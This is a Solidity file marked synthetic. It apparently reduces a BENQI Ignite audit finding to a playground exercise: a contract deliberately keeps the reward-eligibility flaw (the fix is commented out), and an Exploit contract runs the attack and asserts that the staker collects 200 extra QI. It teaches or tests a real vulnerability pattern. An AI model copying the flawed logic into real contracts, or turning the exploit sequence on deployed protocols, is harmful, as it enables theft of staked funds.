// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  BENQI Ignite — QI rewards on a failed registration (Cyfrin, December 2024)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: releaseLockedTokens(failed=true) does not clear
    qiRewardEligibilityByNodeId. redeemAfterExpiry still calls
    ValidatorRewarder.claimRewards for a prevalidated QI stake, so the
    staker is paid the stake plus rewards. The reduced rewarder pays 20%
    of the QI amount, the report's full-duration reward. */

contract QiToken {
    string public symbol = "QI";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ValidatorRewarder {
    QiToken public token;

    constructor(QiToken token_) {
        token = token_;
    }

    function claimRewards(uint256, uint256 stake) external returns (uint256 reward) {
        reward = stake / 5;
        token.transfer(msg.sender, reward);
    }
}

contract Ignite {
    struct Registration {
        uint256 qiAmount;
        uint256 duration;
        bool failed;
    }

    QiToken public token;
    ValidatorRewarder public rewarder;
    mapping(bytes32 => Registration) public regs;
    mapping(bytes32 => bool) public qiRewardEligibilityByNodeId;

    constructor(QiToken token_, ValidatorRewarder rewarder_) {
        token = token_;
        rewarder = rewarder_;
    }

    function registerWithPrevalidatedQiStake(bytes32 nodeId, uint256 amount, uint256 duration) external {
        token.transferFrom(msg.sender, address(this), amount);
        regs[nodeId] = Registration(amount, duration, false);
        qiRewardEligibilityByNodeId[nodeId] = true;
    }

    function releaseLockedTokens(bytes32 nodeId, bool failed) external {
        require(failed, "failed");
        regs[nodeId].failed = true;
        // FIX: qiRewardEligibilityByNodeId[nodeId] = false;
    }

    function redeemAfterExpiry(bytes32 nodeId) external {
        uint256 qiRedemptionAmount = regs[nodeId].qiAmount;
        if (qiRewardEligibilityByNodeId[nodeId]) {
            qiRedemptionAmount += rewarder.claimRewards(regs[nodeId].duration, regs[nodeId].qiAmount); // @> VULN: failed QI registration is still reward-eligible
        }
        token.transfer(msg.sender, qiRedemptionAmount);
    }
}

contract Staker {
    function approveAndStake(QiToken token, Ignite ignite, bytes32 nodeId, uint256 amount) external {
        token.approve(address(ignite), amount);
        ignite.registerWithPrevalidatedQiStake(nodeId, amount, 28 days);
    }

    function redeem(Ignite ignite, bytes32 nodeId) external {
        ignite.redeemAfterExpiry(nodeId);
    }
}

contract Exploit {
    QiToken public token; // CREATE nonce 1
    ValidatorRewarder public rewarder; // CREATE nonce 2
    Ignite public ignite; // CREATE nonce 3
    Staker public staker; // CREATE nonce 4
    bytes32 public constant NODE = keccak256("NodeID-Superpools1");

    constructor() {
        token = new QiToken();
        rewarder = new ValidatorRewarder(token);
        ignite = new Ignite(token, rewarder);
        staker = new Staker();
        token.mint(address(staker), 1000 ether);
        token.mint(address(rewarder), 1000 ether);
    }

    function run() external {
        staker.approveAndStake(token, ignite, NODE, 1000 ether);
        ignite.releaseLockedTokens(NODE, true);
        require(ignite.qiRewardEligibilityByNodeId(NODE), "eligibility cleared");
        staker.redeem(ignite, NODE);
        require(token.balanceOf(address(staker)) == 1200 ether, "stake plus reward");
        require(token.balanceOf(address(rewarder)) == 800 ether, "rewarder drained 200");
    }
}
